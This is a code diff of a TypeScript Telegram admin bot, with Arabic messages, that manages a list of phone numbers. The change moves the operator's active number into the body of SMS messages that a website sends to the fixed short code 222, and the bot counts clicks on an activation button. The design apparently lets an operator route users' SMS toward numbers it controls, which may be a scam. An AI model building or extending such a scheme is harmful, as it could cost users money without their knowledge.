@@ -18,7 +18,7 @@ const pendingActions = new Map<number, PendingAction>();
 
 // Application State
 const appConfig = {
-  smsNumber: '222' // Default SMS number
+  smsNumber: '7700000000' // Number injected into SMS body
 };
 const smsNumbers: string[] = [appConfig.smsNumber];
 
@@ -72,7 +72,7 @@ if (token) {
   try {
     bot = new TelegramBot(token, { polling: true });
     
-    // Command to change SMS number directly (backward compatible)
+    // Command to change managed number directly (backward compatible)
     bot.onText(/\/setsms (.+)/, (msg, match) => {
       const chatId = msg.chat.id;
       if (!isAdmin(chatId)) {
@@ -85,7 +85,7 @@ if (token) {
           bot?.sendMessage(chatId, '⚠️ الرجاء إدخال رقم صالح.');
           return;
         }
-        bot?.sendMessage(chatId, `✅ تم ضبط الرقم النشط إلى: ${appConfig.smsNumber}`);
+        bot?.sendMessage(chatId, `✅ تم ضبط الرقم النشط (داخل نص الرسالة) إلى: ${appConfig.smsNumber}`);
       }
     });
 
@@ -114,7 +114,7 @@ if (token) {
     bot.onText(/\/listsms/, (msg) => {
       const chatId = msg.chat.id;
       if (!isAdmin(chatId)) return;
-      bot?.sendMessage(chatId, `📱 قائمة أرقام التفعيل:\n${formatNumbersList()}`);
+      bot?.sendMessage(chatId, `📱 قائمة الأرقام المُدارة (داخل نص الرسالة):\n${formatNumbersList()}`);
     });
 
     // Set active number by index or number
@@ -201,12 +201,16 @@ if (token) {
 مرحباً بك في لوحة تحكم باقات الأعمال 📱
 
 الأوامر المتاحة:
-/setsms [number] - تعيين رقم نشط مباشرة (متوافق مع النظام القديم).
+/setsms [number] - تعيين الرقم النشط داخل نص رسالة SMS.
 /addsms [number] - إضافة رقم جديد إلى قائمة الأرقام.
 /listsms - عرض جميع الأرقام مع تحديد الرقم النشط.
 /setnumber [index|number] - التبديل بين الأرقام (مثال: /setnumber 2).
 /removesms [index|number] - حذف رقم من القائمة.
 /stats - لعرض إجمالي عدد النقرات على زر التفعيل.
+
+صيغة الإرسال الحالية في الموقع:
+إلى: 222 (ثابت)
+نص الرسالة: سعر_العرض,الرقم_النشط
 
 واجهة الأزرار:
 - 📱 عرض الأرقام
